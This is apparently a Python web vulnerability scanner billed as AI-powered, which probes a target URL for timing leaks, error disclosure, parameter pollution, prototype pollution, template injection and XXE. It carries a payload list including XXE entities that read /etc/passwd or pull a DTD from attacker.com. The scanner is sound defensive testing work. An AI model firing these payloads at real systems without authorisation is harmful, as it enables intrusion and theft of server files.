#!/usr/bin/env python3
"""
AI-Powered Vulnerability Analyzer
Uses machine learning patterns and heuristics to identify complex vulnerabilities
"""

import argparse
import json
import sys
import os
import re
import time
import hashlib
from typing import List, Dict, Any, Tuple
import requests
from urllib.parse import urljoin, urlparse
import random

class AIVulnerabilityAnalyzer:
    def __init__(self, target: str, tool: str, scan_type: str):
        self.target = self.normalize_url(target)
        self.tool = tool.lower()
        self.scan_type = scan_type
        self.vulnerabilities = []
        self.timeout = int(os.getenv('TOOL_TIMEOUT', '300'))
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecureScan Pro AI Analyzer v3.0.0'
        })
        
        # AI-based vulnerability patterns
        self.vulnerability_patterns = {
            'business_logic': [
                r'price.*=.*\d+',
                r'quantity.*=.*\d+',
                r'discount.*=.*\d+',
                r'role.*=.*(admin|user)',
                r'permissions.*=.*\d+'
            ],
            'authentication_bypass': [
                r'login.*bypass',
                r'auth.*skip',
                r'session.*override',
                r'admin.*=.*true',
                r'authenticated.*=.*1'
            ],
            'privilege_escalation': [
                r'role.*promotion',
                r'admin.*upgrade',
                r'permissions.*escalate',
                r'user.*type.*change'
            ],
            'data_leakage': [
                r'api.*key',
                r'secret.*token',
                r'private.*key',
                r'password.*hash',
                r'internal.*data'
            ]
        }
        
        # Advanced attack vectors
        self.advanced_payloads = {
            'prototype_pollution': [
                '{"__proto__":{"admin":true}}',
                '{"constructor":{"prototype":{"admin":true}}}',
                'constructor[prototype][admin]=true'
            ],
            'template_injection': [
                '{{7*7}}',
                '${7*7}',
                '#{7*7}',
                '<%=7*7%>',
                '{%7*7%}'
            ],
            'xxe_injection': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>'
            ],
            'deserialization': [
                'O:8:"stdClass":1:{s:4:"test";s:4:"pwnd";}',
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
                'AC ED 00 05 73 72 00 11'
            ]
        }
    
    def normalize_url(self, url: str) -> str:
        """Normalize and validate URL"""
        if not url.startswith(('http://', 'https://')):
            url = f'https://{url}'
        return url.rstrip('/')
    
    def analyze_application_behavior(self) -> List[Dict]:
        """Analyze application behavior for anomalies"""
        vulnerabilities = []
        
        try:
            # Collect baseline responses
            baseline_responses = self.collect_baseline_responses()
            
            # Analyze response patterns
            pattern_anomalies = self.detect_response_patterns(baseline_responses)
            vulnerabilities.extend(pattern_anomalies)
            
            # Check for timing attacks
            timing_vulns = self.detect_timing_vulnerabilities()
            vulnerabilities.extend(timing_vulns)
            
            # Analyze error messages
            error_vulns = self.analyze_error_messages(baseline_responses)
            vulnerabilities.extend(error_vulns)
            
        except Exception as e:
            print(f"Application behavior analysis error: {e}", file=sys.stderr)
            
        return vulnerabilities
    
    def collect_baseline_responses(self) -> List[Dict]:
        """Collect baseline responses for analysis"""
        responses = []
        
        test_paths = ['/', '/index', '/home', '/about', '/contact', '/login', '/404']
        
        for path in test_paths:
            try:
                url = urljoin(self.target, path)
                start_time = time.time()
                response = self.session.get(url, timeout=10)
                end_time = time.time()
                
                responses.append({
                    'path': path,
                    'url': url,
                    'status_code': response.status_code,
                    'response_time': end_time - start_time,
                    'content_length': len(response.text),
                    'headers': dict(response.headers),
                    'content': response.text[:1000]  # First 1000 chars
                })
                
            except Exception as e:
                print(f"Baseline collection error for {path}: {e}", file=sys.stderr)
                
        return responses
    
    def detect_response_patterns(self, responses: List[Dict]) -> List[Dict]:
        """Detect anomalous response patterns"""
        vulnerabilities = []
        
        # Analyze response time patterns
        response_times = [r['response_time'] for r in responses if 'response_time' in r]
        if response_times:
            avg_time = sum(response_times) / len(response_times)
            
            for response in responses:
                if response.get('response_time', 0) > avg_time * 3:  # 3x slower than average
                    vulnerabilities.append({
                        'type': 'timing_anomaly',
                        'severity': 'medium',
                        'title': f'Timing Anomaly Detected: {response["path"]}',
                        'description': f'Response time ({response["response_time"]:.2f}s) significantly higher than baseline',
                        'target': response['url'],
                        'evidence': {
                            'response_time': response['response_time'],
                            'baseline_avg': avg_time,
                            'deviation': response['response_time'] / avg_time
                        },
                        'recommendation': 'Investigate potential performance issues or timing-based attacks'
                    })
        
        # Analyze content length patterns
        content_lengths = [r['content_length'] for r in responses if 'content_length' in r]
        if content_lengths:
            for response in responses:
                # Check for unusually small or large responses
                if response.get('content_length', 0) < 100:
                    vulnerabilities.append({
                        'type': 'minimal_response',
                        'severity': 'low',
                        'title': f'Minimal Response Content: {response["path"]}',
                        'description': f'Response contains very little content ({response["content_length"]} bytes)',
                        'target': response['url'],
                        'evidence': {'content_length': response['content_length']},
                        'recommendation': 'Verify if minimal responses are intentional'
                    })
                    
        return vulnerabilities
    
    def detect_timing_vulnerabilities(self) -> List[Dict]:
        """Detect timing-based vulnerabilities"""
        vulnerabilities = []
        
        # Test for authentication timing attacks
        try:
            login_paths = ['/login', '/auth', '/signin', '/admin']
            
            for path in login_paths:
                timing_vuln = self.test_authentication_timing(path)
                if timing_vuln:
                    vulnerabilities.append(timing_vuln)
                    
        except Exception as e:
            print(f"Timing vulnerability detection error: {e}", file=sys.stderr)
            
        return vulnerabilities
    
    def test_authentication_timing(self, path: str) -> Dict:
        """Test for authentication timing attacks"""
        try:
            login_url = urljoin(self.target, path)
            
            # Test with valid-looking username vs invalid
            valid_user_data = {'username': 'admin', 'password': 'wrongpassword'}
            invalid_user_data = {'username': 'nonexistentuser123456', 'password': 'wrongpassword'}
            
            # Measure timing for valid username
            valid_times = []
            for _ in range(3):
                start_time = time.time()
                try:
                    self.session.post(login_url, data=valid_user_data, timeout=10)
                except:
                    pass
                valid_times.append(time.time() - start_time)
            
            # Measure timing for invalid username
            invalid_times = []
            for _ in range(3):
                start_time = time.time()
                try:
                    self.session.post(login_url, data=invalid_user_data, timeout=10)
                except:
                    pass
                invalid_times.append(time.time() - start_time)
            
            valid_avg = sum(valid_times) / len(valid_times)
            invalid_avg = sum(invalid_times) / len(invalid_times)
            
            # If there's a significant timing difference
            if abs(valid_avg - invalid_avg) > 0.1:  # 100ms difference threshold
                return {
                    'type': 'authentication_timing',
                    'severity': 'medium',
                    'title': f'Authentication Timing Attack: {path}',
                    'description': f'Login endpoint shows timing differences between valid and invalid usernames',
                    'target': login_url,
                    'evidence': {
                        'valid_username_avg_time': valid_avg,
                        'invalid_username_avg_time': invalid_avg,
                        'time_difference': abs(valid_avg - invalid_avg)
                    },
                    'recommendation': 'Implement constant-time authentication checks'
                }
                
        except Exception as e:
            print(f"Authentication timing test error: {e}", file=sys.stderr)
            
        return None
    
    def analyze_error_messages(self, responses: List[Dict]) -> List[Dict]:
        """Analyze error messages for information disclosure"""
        vulnerabilities = []
        
        error_patterns = {
            'database_errors': [
                r'mysql_connect', r'pg_connect', r'sqlite', r'oracle',
                r'sql server', r'database error', r'query failed'
            ],
            'path_disclosure': [
                r'[a-zA-Z]:\\\\.*\\\\', r'/var/www/', r'/home/',
                r'/usr/local/', r'C:\\\\', r'stack trace'
            ],
            'version_disclosure': [
                r'php/\d+\.\d+', r'apache/\d+\.\d+', r'nginx/\d+\.\d+',
                r'version \d+\.\d+', r'build \d+'
            ]
        }
        
        for response in responses:
            content = response.get('content', '')
            
            for error_type, patterns in error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'information_disclosure',
                            'severity': 'medium',
                            'title': f'Information Disclosure via Error Messages',
                            'description': f'{error_type.replace("_", " ").title()} detected in response',
                            'target': response['url'],
                            'evidence': {
                                'error_type': error_type,
                                'pattern': pattern,
                                'path': response['path']
                            },
                            'recommendation': 'Implement generic error messages and proper error handling'
                        })
                        break
                        
        return vulnerabilities
    
    def analyze_business_logic_flaws(self) -> List[Dict]:
        """Analyze for business logic vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Look for potential business logic flaws
            response = self.session.get(self.target, timeout=10)
            
            # Check for price manipulation patterns
            price_patterns = self.vulnerability_patterns['business_logic']
            for pattern in price_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerabilities.append({
                        'type': 'business_logic_flaw',
                        'severity': 'high',
                        'title': 'Potential Business Logic Vulnerability',
                        'description': f'Pattern suggesting business logic flaw: {pattern}',
                        'target': self.target,
                        'evidence': {'pattern': pattern},
                        'recommendation': 'Review business logic implementation for proper validation'
                    })
            
            # Test for parameter pollution
            pollution_vulns = self.test_parameter_pollution()
            vulnerabilities.extend(pollution_vulns)
            
        except Exception as e:
            print(f"Business logic analysis error: {e}", file=sys.stderr)
            
        return vulnerabilities
    
    def test_parameter_pollution(self) -> List[Dict]:
        """Test for HTTP parameter pollution"""
        vulnerabilities = []
        
        try:
            parsed_url = urlparse(self.target)
            if parsed_url.query:
                from urllib.parse import parse_qs, urlencode, urlunparse
                
                params = parse_qs(parsed_url.query)
                
                for param_name in params:
                    # Test parameter pollution by duplicating parameters
                    polluted_params = {param_name: ['value1', 'value2']}
                    
                    new_query = urlencode(polluted_params, doseq=True)
                    polluted_url = urlunparse((
                        parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                        parsed_url.params, new_query, parsed_url.fragment
                    ))
                    
                    response = self.session.get(polluted_url, timeout=10)
                    
                    # Check if both values are processed
                    if 'value1' in response.text and 'value2' in response.text:
                        vulnerabilities.append({
                            'type': 'parameter_pollution',
                            'severity': 'medium',
                            'title': f'HTTP Parameter Pollution: {param_name}',
                            'description': f'Parameter {param_name} accepts multiple values, potentially causing confusion',
                            'target': polluted_url,
                            'evidence': {'parameter': param_name, 'pollution_test': 'both_values_processed'},
                            'recommendation': 'Implement proper parameter handling to prevent pollution attacks'
                        })
                        
        except Exception as e:
            print(f"Parameter pollution test error: {e}", file=sys.stderr)
            
        return vulnerabilities
    
    def test_advanced_injection_vectors(self) -> List[Dict]:
        """Test for advanced injection vulnerabilities"""
        vulnerabilities = []
        
        # Test prototype pollution
        prototype_vulns = self.test_prototype_pollution()
        vulnerabilities.extend(prototype_vulns)
        
        # Test template injection
        template_vulns = self.test_template_injection()
        vulnerabilities.extend(template_vulns)
        
        # Test XXE injection
        xxe_vulns = self.test_xxe_injection()
        vulnerabilities.extend(xxe_vulns)
        
        return vulnerabilities
    
    def test_prototype_pollution(self) -> List[Dict]:
        """Test for prototype pollution vulnerabilities"""
        vulnerabilities = []
        
        try:
            for payload in self.advanced_payloads['prototype_pollution']:
                # Test in URL parameter
                test_url = f"{self.target}{'&' if '?' in self.target else '?'}data={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for signs of prototype pollution
                    if any(indicator in response.text.lower() for indicator in 
                           ['prototype', 'constructor', '__proto__']):
                        vulnerabilities.append({
                            'type': 'prototype_pollution',
                            'severity': 'high',
                            'title': 'Potential Prototype Pollution Vulnerability',
                            'description': f'Application may be vulnerable to prototype pollution: {payload}',
                            'target': test_url,
                            'evidence': {'payload': payload, 'method': 'url_parameter'},
                            'recommendation': 'Validate and sanitize JSON input, avoid unsafe object merging'
                        })
                        break
                        
                except Exception as e:
                    print(f"Prototype pollution test error: {e}", file=sys.stderr)
                    
        except Exception as e:
            print(f"Prototype pollution testing error: {e}", file=sys.stderr)
            
        return vulnerabilities
    
    def test_template_injection(self) -> List[Dict]:
        """Test for server-side template injection"""
        vulnerabilities = []
        
        try:
            for payload in self.advanced_payloads['template_injection']:
                test_url = f"{self.target}{'&' if '?' in self.target else '?'}template={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if template expression was evaluated (7*7=49)
                    if '49' in response.text:
                        vulnerabilities.append({
                            'type': 'template_injection',
                            'severity': 'critical',
                            'title': 'Server-Side Template Injection',
                            'description': f'Template injection vulnerability confirmed with payload: {payload}',
                            'target': test_url,
                            'evidence': {'payload': payload, 'result': 'expression_evaluated'},
                            'recommendation': 'Disable template evaluation for user input or use sandboxed templates'
                        })
                        break
                        
                except Exception as e:
                    print(f"Template injection test error: {e}", file=sys.stderr)
                    
        except Exception as e:
            print(f"Template injection testing error: {e}", file=sys.stderr)
            
        return vulnerabilities
    
    def test_xxe_injection(self) -> List[Dict]:
        """Test for XXE injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Look for XML endpoints
            xml_endpoints = ['/api/xml', '/upload', '/import', '/export']
            
            for endpoint in xml_endpoints:
                endpoint_url = urljoin(self.target, endpoint)
                
                for payload in self.advanced_payloads['xxe_injection']:
                    try:
                        headers = {'Content-Type': 'application/xml'}
                        response = self.session.post(endpoint_url, data=payload, headers=headers, timeout=10)
                        
                        # Check for XXE indicators
                        if any(indicator in response.text.lower() for indicator in 
                               ['root:', '/etc/passwd', 'bin/bash', 'xml external entity']):
                            vulnerabilities.append({
                                'type': 'xxe_injection',
                                'severity': 'critical',
                                'title': f'XXE Injection Vulnerability: {endpoint}',
                                'description': f'XML External Entity injection confirmed at {endpoint}',
                                'target': endpoint_url,
                                'evidence': {'endpoint': endpoint, 'payload': payload[:100]},
                                'recommendation': 'Disable XML external entity processing and use safe XML parsers'
                            })
                            break
                            
                    except Exception as e:
                        print(f"XXE test error for {endpoint}: {e}", file=sys.stderr)
                        
        except Exception as e:
            print(f"XXE injection testing error: {e}", file=sys.stderr)
            
        return vulnerabilities
    
    def perform_ai_risk_assessment(self) -> Dict[str, Any]:
        """Perform AI-based risk assessment"""
        risk_score = 0
        risk_factors = []
        
        # Calculate risk based on vulnerabilities found
        severity_weights = {'critical': 10, 'high': 7, 'medium': 4, 'low': 1}
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'low')
            risk_score += severity_weights.get(severity, 1)
            
            if severity in ['critical', 'high']:
                risk_factors.append(vuln['title'])
        
        # Determine overall risk level
        if risk_score >= 30:
            risk_level = 'critical'
        elif risk_score >= 20:
            risk_level = 'high'
        elif risk_score >= 10:
            risk_level = 'medium'
        else:
            risk_level = 'low'
        
        return {
            'overall_risk_level': risk_level,
            'risk_score': risk_score,
            'critical_risk_factors': risk_factors[:5],  # Top 5 risks
            'vulnerability_distribution': {
                'critical': len([v for v in self.vulnerabilities if v.get('severity') == 'critical']),
                'high': len([v for v in self.vulnerabilities if v.get('severity') == 'high']),
                'medium': len([v for v in self.vulnerabilities if v.get('severity') == 'medium']),
                'low': len([v for v in self.vulnerabilities if v.get('severity') == 'low'])
            }
        }
    
    def run_scan(self) -> Dict[str, Any]:
        """Execute AI-powered vulnerability analysis"""
        print(f"Starting AI vulnerability analysis for {self.target}", file=sys.stderr)
        
        # Run different analysis modules
        analysis_modules = {
            'behavior': self.analyze_application_behavior,
            'business_logic': self.analyze_business_logic_flaws,
            'advanced_injection': self.test_advanced_injection_vectors,
            'comprehensive': lambda: (
                self.analyze_application_behavior() +
                self.analyze_business_logic_flaws() +
                self.test_advanced_injection_vectors()
            )
        }
        
        if self.tool in analysis_modules:
            vulnerabilities = analysis_modules[self.tool]()
        else:
            vulnerabilities = analysis_modules['comprehensive']()
        
        self.vulnerabilities.extend(vulnerabilities)
        
        # Perform AI risk assessment
        risk_assessment = self.perform_ai_risk_assessment()
        
        return {
            'tool': self.tool,
            'target': self.target,
            'scan_type': self.scan_type,
            'vulnerabilities_found': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'ai_risk_assessment': risk_assessment,
            'analysis_modules_executed': list(analysis_modules.keys()) if self.tool == 'comprehensive' else [self.tool],
            'execution_time': time.time()
        }

def main():
    parser = argparse.ArgumentParser(description='AI-Powered Vulnerability Analyzer')
    parser.add_argument('--tool', required=True, help='Analysis type (behavior, business_logic, advanced_injection, comprehensive)')
    parser.add_argument('--target', required=True, help='Target URL to analyze')
    parser.add_argument('--scan-type', required=True, help='Type of scan being performed')
    
    args = parser.parse_args()
    
    try:
        analyzer = AIVulnerabilityAnalyzer(args.target, args.tool, args.scan_type)
        result = analyzer.run_scan()
        print(json.dumps(result, indent=2))
        
    except Exception as e:
        error_result = {
            'error': str(e),
            'tool': args.tool,
            'target': args.target,
            'vulnerabilities': []
        }
        print(json.dumps(error_result), file=sys.stderr)
        sys.exit(1)

if __name__ == '__main__':
    main()